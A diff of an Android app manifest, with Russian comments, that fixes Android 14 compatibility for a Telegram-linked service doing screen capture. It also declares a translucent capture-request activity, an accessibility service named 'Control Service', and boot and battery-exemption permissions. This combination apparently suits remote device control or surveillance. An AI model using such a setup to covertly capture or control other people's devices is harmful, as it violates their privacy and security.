@@ -5,8 +5,16 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <!--
+        FIX: добавлен тип mediaProjection — обязателен на Android 14+
+        для использования MediaProjection в foreground service.
+        specialUse остаётся для совместимости.
+    -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
+        tools:ignore="ProtectedPermissions" />
+
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
@@ -28,17 +36,31 @@
             </intent-filter>
         </activity>
 
-        <activity android:name=".ScreenCaptureRequestActivity" 
-                  android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity
+            android:name=".ScreenCaptureRequestActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="false" />
 
-        <service android:name=".TelegramService" android:exported="false" android:foregroundServiceType="specialUse" />
-        <service android:name=".MyAccessibilityService" android:exported="true"
-                 android:label="Control Service"
-                 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+        <!--
+            FIX: добавлен foregroundServiceType="mediaProjection|specialUse"
+            Без mediaProjection → SecurityException на Android 14
+        -->
+        <service
+            android:name=".TelegramService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection|specialUse" />
+
+        <service
+            android:name=".MyAccessibilityService"
+            android:exported="true"
+            android:label="Control Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
-            <meta-data android:name="android.accessibilityservice" android:resource="@xml/service_config" />
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/service_config" />
         </service>
 
     </application>
